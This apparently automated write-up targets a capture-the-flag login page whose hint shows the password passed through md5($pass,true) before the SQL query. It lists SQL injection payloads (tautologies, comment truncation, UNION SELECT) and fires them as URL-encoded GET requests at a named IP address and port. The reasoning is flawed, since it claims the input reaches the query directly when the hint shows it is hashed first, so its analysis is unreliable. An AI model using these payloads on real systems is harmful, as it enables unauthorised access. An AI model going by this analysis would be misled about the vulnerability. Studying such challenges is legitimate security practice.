Potential SQL Injection and Vulnerability\n\n**Vulnerability description**:\nThe source code includes a hint comment `'select * from 'admin' where password=md5($pass,true)'` which suggests that the application uses an SQL query to validate the password input. This comment indicates the logic behind the password validation and hints at potential SQL Injection. Since `$pass` is being directly used in the SQL query, it might be possible to manipulate the SQL query by providing crafted input.\n\n**source code**:\n\n```html\n<!DOCTYPE html>\n<meta charset=\"utf-8\"/>\n<meta content=\"IE=edge\" http-equiv=\"X-UA-Compatible\"/>\n<meta content=\"width=device-width, initial-scale=1\" name=\"viewport\"/>\n<!-- /header end -->\n<form action=\"leveldo4.php\" class=\"upload\" method=\"GET\">\n<input class=\"in\" id=\"name\" name=\"password\" type=\"text\"/>\n<input class=\"give\" type=\"submit\"/>\n</form>\n<!-- /main end -->\n<!-- /container end -->\n<script src=\"https://code.jquery.com/jquery-3.1.1.min.js\"></script>\n<!-- hint: select * from 'admin' where password=md5($pass,true) -->\n```\n\n**attack code**:\nTo exploit this possible SQL Injection vulnerability, we could try to bypass the `md5($pass, true)` condition. Given that we should input a specific format `BJD{}` for the flag, we can start by inputting a basic SQL payload:\n\n```sql\n' or '1'='1\n```\n\nThis input should be URL encoded if placing it in a GET request:\n```\nhttp://47.251.44.45:40014/leveldo4.php?password=%27%20or%20%271%27%3D%271\n```\n\nNext, iteratively adjust the payload to look for the specific flag format `BJD{}`:\n\n```sql\n' OR 1=1-- \n```\n\nURL encoded:\n```\nhttp://47.251.44.45:40014/leveldo4.php?password=%27%20OR%201%3D1--\n```\n\n### 2. Possible Hidden Comment Indications\n\n**Vulnerability description**:\nComments hidden within the source code provide clues to explore further, such as `'select * from 'admin' where password=md5($pass,true)'`. We should ensure there are no hidden inputs or script manipulations which could further indicate the location of the flag.\n\n**source code**:\n\n```html\n<!-- hint: select * from 'admin' where password=md5($pass,true) -->\n```\n\n**attack code**:\nAttempting a SQL Injection direct query (understanding the password validation mechanism):\n\n```sql\n' UNION SELECT null,null-- \n```\n\nURL encoded:\n```\nhttp://47.251.44.45:40014/leveldo4.php?password=%27%20UNION%20SELECT%20null,null--\n```\n\n### Summary\nThrough these steps and observations, we aim to exploit potential SQL vulnerabilities based on the analysis of current code structure and comments. Further tuning might be necessary based on immediate responses received from the URL endpoints to correctly extract the flag in the format `BJD{}`.",
